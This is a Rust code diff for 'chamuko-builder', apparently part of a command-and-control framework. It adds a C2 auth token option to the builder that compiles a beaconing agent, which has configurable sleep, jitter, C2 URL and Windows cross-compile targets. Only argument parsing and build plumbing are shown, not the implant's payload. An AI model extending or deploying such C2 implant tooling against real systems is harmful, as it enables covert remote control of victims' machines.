@@ -7,6 +7,7 @@ struct Config {
     sleep: u64,
     jitter: u64,
     name: String,
+    token: Option<String>,
     output: PathBuf,
     release: bool,
     target: Option<String>,
@@ -34,6 +35,7 @@ fn parse_args() -> Result<Config, String> {
     let mut sleep = 10u64;
     let mut jitter = 3u64;
     let mut name = String::new();
+    let mut token: Option<String> = None;
     let mut output = PathBuf::from("./chamuko-agent");
     let mut release = true;
     let mut target: Option<String> = None;
@@ -58,6 +60,10 @@ fn parse_args() -> Result<Config, String> {
             "--name" | "-n" => {
                 i += 1;
                 name = take(&args, i)?;
+            }
+            "--token" => {
+                i += 1;
+                token = Some(take(&args, i)?);
             }
             "--output" | "-o" => {
                 i += 1;
@@ -87,6 +93,7 @@ fn parse_args() -> Result<Config, String> {
         sleep,
         jitter,
         name,
+        token,
         output,
         release,
         target,
@@ -101,7 +108,7 @@ fn take(args: &[String], i: usize) -> Result<String, String> {
 
 fn print_help() {
     eprintln!(
-        "chamuko-builder — compile a chamuko-agent with embedded C2 config\n\n\
+        "chamuko-builder: compile a chamuko-agent with embedded C2 config\n\n\
          USAGE:\n  \
          chamuko-builder --url <URL> [OPTIONS]\n\n\
          OPTIONS:\n  \
@@ -109,6 +116,7 @@ fn print_help() {
          --sleep <s>        base beacon sleep seconds (default: 10)\n  \
          --jitter <s>       max random jitter seconds (default: 3)\n  \
          --name <name>      agent label (default: empty)\n  \
+         --token <tok>      C2 auth token embedded in the agent\n  \
          --output <path>    output binary path (default: ./chamuko-agent)\n  \
          --target <triple>  cross-compile target (e.g. x86_64-pc-windows-gnu)\n  \
          --debug            build in debug mode (default: release)\n  \
@@ -124,8 +132,13 @@ fn build(config: &Config) -> Result<(), String> {
     let profile = if config.release { "release" } else { "debug" };
 
     eprintln!(
-        "[builder] building agent: url={} sleep={} jitter={} name='{}' profile={}",
-        config.url, config.sleep, config.jitter, config.name, profile
+        "[builder] building agent: url={} sleep={} jitter={} name='{}' auth={} profile={}",
+        config.url,
+        config.sleep,
+        config.jitter,
+        config.name,
+        if config.token.is_some() { "token" } else { "none" },
+        profile
     );
 
     let is_windows_target = config
@@ -146,7 +159,8 @@ fn build(config: &Config) -> Result<(), String> {
         .env("CHAMUKO_C2_URL", &config.url)
         .env("CHAMUKO_SLEEP", config.sleep.to_string())
         .env("CHAMUKO_JITTER", config.jitter.to_string())
-        .env("CHAMUKO_NAME", &config.name);
+        .env("CHAMUKO_NAME", &config.name)
+        .env("CHAMUKO_TOKEN", config.token.as_deref().unwrap_or(""));
 
     if config.release {
         cmd.arg("--release");
